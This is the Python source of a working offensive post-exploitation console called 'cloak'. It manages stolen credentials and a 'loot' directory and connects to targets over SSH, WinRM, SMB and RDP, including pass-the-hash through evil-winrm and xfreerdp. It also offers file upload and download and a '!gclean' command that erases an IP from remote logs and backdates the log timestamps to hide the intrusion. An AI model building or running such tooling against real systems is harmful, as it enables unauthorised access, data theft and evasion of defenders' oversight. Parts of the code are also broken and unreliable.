import os
import sys
import ipaddress
import subprocess
import pexpect #Required for fake SSH shell to keep one session open
import time
from rich.console import Console
from rich.table import Table
from rich.text import Text
from prompt_toolkit import PromptSession
from completer import CloakCompleter
from prompt_toolkit.styles import Style
from prompt_toolkit.completion import WordCompleter, Completer, Completion

# Flags Set to Null
current_protocol = None
target_ip = None
target_port = None
credential_type = None
credential_value = None

# CLI Style to Look Cool and Fancy Like Sliver and Metasploit
cloak_style = Style.from_dict({
    "prompt": "ansiblue bold"
})

ssh_key_directory = None  # <-- define this here

available_protocols = ["WinRM", "SMB", "RDP", "SSH", "SFTP"]
available_credential_types = ["password", "key", "hash"]
credentials = {}  # { username: (type, value) }
protocol_completer = WordCompleter(available_protocols, ignore_case=True)

# Set console to be an interactive console that we can reuse everywhere
console = Console()

# Set Loot Directory within Docker Container that is also mounted to Host Machine
def loot():
    loot_directory = "/app/loot"
    try:
        os.chdir(loot_directory)
        print(f"[+] Changed working directory to:", os.getcwd())
    except Exception as e:
        print(f"[-] Error changing directory: {e}")

# Function to List Loot in Loot Directory in Cleanly Formatted Table
def list_loot_files():
    loot_path = "/app/loot"
    try:
        files = os.listdir(loot_path)
    except Exception as e:
        print(f"Error reading loot dir: {e}")
        return

    table = Table(title="Loot Files", show_lines=True)
    table.add_column("Filename", style="cyan", no_wrap=True)
    table.add_column("Size (bytes)", style="magenta")
    table.add_column("Last Modified", style="green")

    for f in files:
        full_path = os.path.join(loot_path, f)
        if os.path.isfile(full_path):
            size = str(os.path.getsize(full_path))
            mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(full_path)))
            table.add_row(f, size, mtime)

    console.print(table)

def use_credential(index):
    global credential_type, credential_value
    if not credentials:
        console.print("[red]No credentials have been set.[/red]")
        return
    try:
        key = list(credentials.keys())[index - 1]
        credential_type, credential_value = credentials[key]
        console.print(f"[green]Now using credential #[/green] {index} [green]for user:[/green] {key}")
    except IndexError:
        console.print(f"[red]Invalid credential index:[/red] {index}")

def show():
    table = Table(title="Current Configuration", show_lines=True)
    table.add_column("Key", style="cyan", no_wrap=True)
    table.add_column("Value", style="magenta")

    table.add_row("Protocol", current_protocol if current_protocol else "[italic]Not set[/italic]")
    table.add_row("Target IP", target_ip if target_ip else "[italic]Not set[/italic]")
    table.add_row("Port", str(target_port) if target_port else "[italic]Not set[/italic]")
    table.add_row("SSH Key", ssh_key_directory if ssh_key_directory else "[italic]Not set[/italic]")

    console.print(table)

    # If credentials exist, print a second table
    if credentials:
        cred_table = Table(title="Stored Credentials", show_lines=True)
        cred_table.add_column("Username", style="cyan")
        cred_table.add_column("Type", style="magenta")
        cred_table.add_column("Value", style="green")
        for user, (ctype, cval) in credentials.items():
            cred_table.add_row(user, ctype, cval)
        console.print(cred_table)

def connect():
    if current_protocol is None:
        console.print("[red]Protocol not set. Use 'set protocol <value>' first.[/red]")
        return

    match current_protocol.upper():
        case "SFTP":
            sftp()
        case "SSH":
            ssh()
        case "WINRM":
            winrm()
        case "SMB":
            smb()
        case "RDP":
            rdp()
        case _:
            console.print(f"[red]Unsupported protocol for connect():[/red] {current_protocol}")

def shell_prompt():
    console.print("[bold green]Opening interactive shell session...[/bold green]")

    try:
        child = pexpect.spawn(
            f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-o PreferredAuthentications=password -o PubkeyAuthentication=no "
            f"-o LogLevel=ERROR -p {target_port} {username}@{target_ip}"
        )
        child.expect("password:")
        child.sendline(cred_value)
        child.expect(r"\$|\#")  # Wait for shell prompt

        while True:
            cmd = input("shell > ")
            if cmd.strip().lower() in ["exit", "quit"]:
                child.sendline("exit")
                break

            child.sendline(cmd)
            child.expect(r"\$|\#")
            output = child.before.decode("utf-8", errors="ignore")
            console.print(output.strip())

    except Exception as e:
        console.print(f"[red]SSH shell failed:[/red] {e}")

def ssh():
    import time
    import getpass
    import tempfile

    if not all([target_ip, target_port, credentials]):
        console.print("[red]Missing required configuration. Use 'show' to verify.[/red]")
        return

    if len(credentials) == 0:
        console.print("[red]No credentials set. Use:[/red] set credential <username> <type> <value>")
        return

    username, (cred_type, cred_value) = next(iter(credentials.items()))
    if cred_type != "password":
        console.print(f"[red]SSH only supports password-based SSH in this function (got: {cred_type})[/red]")
        return

    socket_dir = os.path.join(tempfile.gettempdir(), f"cloak-{getpass.getuser()}")
    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
    socket_path = os.path.join(socket_dir, "ssh.sock")

    console.print(f"[bold green]Starting SSH session to {username}@{target_ip}:{target_port}...[/bold green]")

    try:
        subprocess.run([
            "sshpass", "-p", cred_value,
            "ssh", "-M", "-S", socket_path, "-fnNT",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            f"{username}@{target_ip}", "-p", str(target_port)
        ], check=True)

        while True:
            cmd = input("shell > ").strip()
            if cmd in ["exit", "quit"]:
                break

            elif cmd.startswith("!get "):
                path = cmd.split(" ", 1)[1]
                console.print(f"Downloading {path}...")
                try:
                    sftp_cmd = f"get {path}"
                    subprocess.run([
                        "sshpass", "-p", cred_value,
                        "sftp", "-o", f"ControlPath={socket_path}",
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        f"{username}@{target_ip}"
                    ], input=sftp_cmd.encode(), check=True)
                except subprocess.CalledProcessError as e:
                    console.print(f"[red]Download failed:[/red] {e}")

            elif cmd.startswith("!put"):
                parts = cmd.split()
                if len(parts) == 2:
                    src, dst = parts[1], "~"
                elif len(parts) == 3:
                    src, dst = parts[1], parts[2]
                else:
                    console.print("[red]Usage: !put <local_file> [remote_path][/red]")
                    continue
                console.print(f"Uploading {src} to {dst}...")
                try:
                    sftp_cmd = f"put {src} {dst}"
                    subprocess.run([
                        "sshpass", "-p", cred_value,
                        "sftp", "-o", f"ControlPath={socket_path}",
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        f"{username}@{target_ip}"
                    ], input=sftp_cmd.encode(), check=True)
                except subprocess.CalledProcessError as e:
                    console.print(f"[red]Upload failed:[/red] {e}")

            elif cmd.startswith("!gclean"):
                parts = cmd.split()
                if len(parts) != 3:
                    console.print("[red]Usage: !gclean <log_path> <ip>[/red]")
                    continue
                log_path, ip_to_clean = parts[1], parts[2]

                remote_script = f"""
cp {log_path} /tmp/.cloaklog.bak && \
grep -vi '{ip_to_clean}' /tmp/.cloaklog.bak > /tmp/.cloaklog.clean && \
if ! grep -q '{ip_to_clean}' /tmp/.cloaklog.clean; then \
    cp /tmp/.cloaklog.clean {log_path} && \
    echo '[+] Overwritten {log_path} with cleaned log.'; \
    diff /tmp/.cloaklog.clean {log_path}; \
    ts=$(tail -n 1 {log_path} | awk '{{print $1, $2, $3}}'); \
    if [ ! -z "$ts" ]; then \
        touch -md "$ts" {log_path}; \
        echo '[+] Timestamp adjusted to last entry: ' "$ts"; \
    fi; \
else \
    echo '[-] IP still present. Aborting overwrite.'; \
fi
"""
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    remote_script
                ])
            else:
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    cmd
                ])
    finally:
        subprocess.run(["ssh", "-S", socket_path, "-O", "exit", f"{username}@{target_ip}"])


def sftp():
    if not all([target_ip, target_port, credentials]):
        console.print("[red]Missing required configuration. Use 'show' to verify.[/red]")
        return

    if len(credentials) == 0:
        console.print("[red]No credentials set. Use:[/red] set credential <username> <type> <value>")
        return

    # Get the first credential set
    username, (cred_type, cred_value) = next(iter(credentials.items()))

    if cred_type != "password":
        console.print(f"[red]SFTP only supports password-based SSH in this function (got: {cred_type})[/red]")
        return

    ssh_cmd = [
        "sftp",
        "-M", "-S", "/tmp/ssh-socket",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        f"{username}@{target_ip}",
        "-p", str(target_port),
    ]

    try:
        console.print(f"[bold green]Starting SFTP SSH session to {username}@{target_ip}:{target_port}...[/bold green]")
        subprocess.run(ssh_cmd)
    except Exception as e:
        console.print(f"[red]Failed to start SSH session:[/red] {e}")

def winrm():
    if not all([target_ip, target_port, credentials]):
        console.print("[red]Missing required configuration. Use 'show' to verify.[/red]")
        return

    if len(credentials) == 0:
        console.print("[red]No credentials set. Use:[/red] set credential <username> <type> <value>")
        return

    username, (cred_type, cred_value) = next(iter(credentials.items()))

    console.print(f"[bold green]Starting WinRM session to {username}@{target_ip}:{target_port}...[/bold green]")

    try:
        if cred_type == "password":
            winrm_cmd = [
                "evil-winrm",
                "-i", target_ip,
                "-P", str(target_port),
                "-u", username,
                "-p", cred_value
            ]
        elif cred_type == "hash":
            winrm_cmd = [
                "evil-winrm",
                "-i", target_ip,
                "-P", str(target_port),
                "-u", username,
                "-H", cred_value
            ]
        else:
            console.print(f"[red]Unsupported credential type for WinRM:[/red] {cred_type}")
            return

        subprocess.run(winrm_cmd)

    except Exception as e:
        console.print(f"[red]WinRM session error:[/red] {e}")

def smb():
    if not all([target_ip, target_port, credentials]):
        console.print("[red]Missing required configuration. Use 'show' to verify.[/red]")
        return

    if len(credentials) == 0:
        console.print("[red]No credentials set. Use:[/red] set credential <username> <type> <value>")
        return

    username, (cred_type, cred_value) = next(iter(credentials.items()))

    console.print(f"[bold green]Starting SMB session to {username}@{target_ip}:{target_port}...[/bold green]")

    try:
        if cred_type == "password":
            smb_cmd = [
                "python",
                "/app/slinger/src/slinger.py",
                "-host", target_ip,
                "-port", str(target_port),
                "--username", username,
                "--password", cred_value
            ]
        elif cred_type == "hash":
            smb_cmd = [
                "python",
                "/app/slinger/src/slinger.py"
                "-host", target_ip,
                "-port", str(target_port),
                "--username", username,
                "-ntlm", cred_value
            ]
        else:
            console.print(f"[red]Unsupported credential type for SMB:[/red] {cred_type}")
            return

        subprocess.run(smb_cmd)

    except Exception as e:
        console.print(f"[red]SMB session error:[/red] {e}")

def rdp():
    if not all([target_ip, target_port, credentials]):
        console.print("[red]Missing required configuration. Use 'show' to verify.[/red]")
        return

    if len(credentials) == 0:
        console.print("[red]No credentials set. Use:[/red] set credential <username> <type> <value>")
        return

    username, (cred_type, cred_value) = next(iter(credentials.items()))

    console.print(f"[bold green]Starting RDP session to {username}@{target_ip}:{target_port}...[/bold green]")

    try:
        if cred_type == "password":
            rdp_cmd = [
                "xfreerdp",
                "/cert-ignore",
                f"/u:{username}",
                f"/p:{cred_value}",
                f"/v:{target_ip}:{target_port}",
            ]
        elif cred_type == "hash":
            rdp_cmd = [
                "xfreerdp",
                "/cert-ignore",
                f"/u:{username}",
                f"/pth:{cred_value}",
                f"/v:{target_ip}:{target_port}",
            ]
        else:
            console.print(f"[red]Unsupported credential type for RDP:[/red] {cred_type}")
            return

        subprocess.run(rdp_cmd)

    except Exception as e:
        console.print(f"[red]RDP session error:[/red] {e}")

def main():
    global ssh_key_directory, current_protocol, target_ip, target_port, credential_type, credential_value
    if ssh_key_directory is None:
        ssh_key_directory = os.path.expanduser("~/.ssh")

    loot()

    console = Console()

    cloak_art = r"""
.................................................
...................:-+***+-:.....................
.................-*%%%%%%%%%=....................
................=#%####**####+...................
...............+%%**###%@@@%##+..................
..............+%%#*%@@@@@@@@%#%*:................
.............+%%%*#@@@@@@@@@@%#%#-...............
............-#%%#*@@@@@@@@@@@@#%%*-..............
............-*%%*#@@@@@@@@@@@@#%%*:..............
..........:+%%%%#*#@@@@@@@@@@@%%%%*:.............
.........:+%%%%%@%%%%@@@@@@@%%%%%%%%+:...........
........:+%%%%%%%%%%%#=+=*%%%%%%%%%%#+:..........
........+%%%%%%%%%%%%%===+%%%%@%%%%%%%=:.........
.......=%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%#=.........
......=%%%%%%%%%%%%%%%%#%@*%%%%%%%%%%%##=........
.....-%%%%%%%%%%%%%%%%%*%@%*#%%%%%%%%%%%#-.......
....:#%%%%%%%%%%%%%%%%#*%@@#*#%%%%%%%%%%%#-......
...:*%%%%%%%%%%%%%%%%%#*%@@@**%%%%%%%%%%%%#-.....
...+%%%%%%%%%%%%%%%%%%#*%@@@%*#%%%%%%%%%%%%%+:...
..:%%%%%%%%%%%%%%%%%%%#*#@@@@#*#%%%%%%%%%%%%%#-..
..+%%%%%%%%%%%%%%%%%%%#*#@@@@@**%%%%%%%%%%%%%#*+.
..%%%%%%%%%%%%%%%%%%%%#**@@@@@%*#%%%%%%%%%%%#**..
.-%%%%%%%%%%%%%%%%%%@%%**@@@@@@#*#%%%%%%%%%#*#-..
.+%%%%%%@%#%%%%%%%%%@%%**%@@@@@%**#%%%%%%%#*#+...
.*##%##%#%%%%%%%%%%%%%%#*#@@@@@@#**#%%%%%#***:...
.*********#%%%%%%%%%%%%#*#@@@@@@%**#%%%%#**+:....
.::-=+*##****##%%%%%%%%%**%@@@@@%***##****-......
........::=*****##%%%%%%#*##*=-:-#******-........
............:=******#####***....:**##+-..........
...............:=+**********-....:-:.............
...................:--===-:......................
.................................................
    """
    console.print(Text(cloak_art, style="bold green"), justify="center")

    session = PromptSession(
        [("class:prompt", "cloak > ")],
        completer=CloakCompleter(),
        complete_while_typing=True,
        style=cloak_style,
        enable_history_search=False,
        complete_in_thread=False,
    )

    def use_credential(index):
        global credential_type, credential_value
        try:
            username = list(credentials.keys())[index - 1]
            credential_type, credential_value = credentials[username]
            console.print(f"[green]Using credential {index} ({username})[/green]")
        except (IndexError, ValueError):
            console.print("[red]Invalid credential index.[/red]")

    while True:
        try:
            raw_input = session.prompt().strip()
            if not raw_input:
                continue
            parts = raw_input.split()
            cmd = parts[0].lower()

            match cmd:
                case "exit" | "quit":
                    console.print("[bold red]Exiting cloak...[/bold red]")
                    break

                case "help":
                    console.print("[bold cyan]Commands:[/bold cyan] set, use, run, loot, help, show, exit")

                case "list_loot":
                    list_loot_files()

                case "show":
                    show()

                case "connect":
                    connect()

                case "use":
                    if len(parts) == 3 and parts[1] == "credential" and parts[2].isdigit():
                        use_credential(int(parts[2]))
                    else:
                        console.print("[red]Usage: use credential <index>[/red]")

                case "set":
                    if len(parts) < 3:
                        console.print("[cyan]Usage:[/cyan] set <key> <value>")
                        console.print("[cyan]Available keys:[/cyan] protocol, target, port, credential")
                        continue

                    key = parts[1].lower()

                    # Special case for credentials (expects 5 parts: set credential <username> <type> <value>)
                    if key == "credential":
                        if len(parts) != 5:
                            console.print("[red]Usage:[/red] set credential <username> <type> <value>")
                            continue
                        username, cred_type, cred_value = parts[2], parts[3], parts[4]
                        if cred_type not in available_credential_types:
                            console.print(f"[red]Invalid credential type:[/red] {cred_type}")
                        else:
                            credentials[username] = (cred_type, cred_value)
                            console.print(f"[green]Credential set for:[/green] {username} ({cred_type})")
                        continue

                    if len(parts) != 3:
                        console.print(f"[red]Usage:[/red] set {key} <value>")
                        continue

                    value = parts[2]

                    match key:
                        case "protocol":
                            if value in available_protocols:
                                current_protocol = value
                                console.print(f"[green]Protocol set to:[/green] {current_protocol}")
                            else:
                                console.print(f"[red]Invalid protocol:[/red] {value}")

                        case "target":
                            try:
                                ipaddress.ip_address(value)
                                target_ip = value
                                console.print(f"[green]Target set to:[/green] {target_ip}")
                            except ValueError:
                                console.print(f"[red]Invalid IP address:[/red] {value}")

                        case "port":
                            if value.isdigit() and 1 <= int(value) <= 65535:
                                target_port = int(value)
                                console.print(f"[green]Port set to:[/green] {target_port}")
                            else:
                                console.print(f"[red]Invalid port:[/red] {value}")

                        case _:
                            console.print(f"[red]Unknown setting:[/red] {key}")

                case _:
                    console.print(f"[yellow]Unknown command:[/yellow] {raw_input}")

        except KeyboardInterrupt:
            continue
        except EOFError:
            break


if __name__ == "__main__":
    main()

